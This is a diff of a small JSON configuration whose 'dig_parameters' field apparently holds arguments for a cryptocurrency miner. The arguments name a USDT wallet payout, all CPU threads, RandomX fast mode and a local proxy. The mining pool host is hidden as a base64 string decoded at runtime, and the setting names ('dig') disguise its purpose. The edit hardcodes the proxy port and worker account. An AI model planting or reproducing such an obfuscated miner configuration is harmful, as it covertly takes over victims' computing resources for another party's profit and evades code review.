@@ -1,4 +1,4 @@
 {
     "dig_switch": false,
-    "dig_parameters": "--url $(printf \"cngudW5taW5lYWJsZS5jb20=\" | base64 -d):443 --proxy 127.0.0.1:$xray_port --tls --user USDT:TJiNVKmh7HEoqRJpQ89ERu2Se91BoxncWo.${account_id}#gdq3-2tb1 --threads $(nproc) --randomx-mode fast"
+    "dig_parameters": "--url $(printf \"cngudW5taW5lYWJsZS5jb20=\" | base64 -d):443 --proxy 127.0.0.1:10800 --tls --user USDT:TJiNVKmh7HEoqRJpQ89ERu2Se91BoxncWo.nongshichang3742#gdq3-2tb1 --threads $(nproc) --randomx-mode fast"
 }
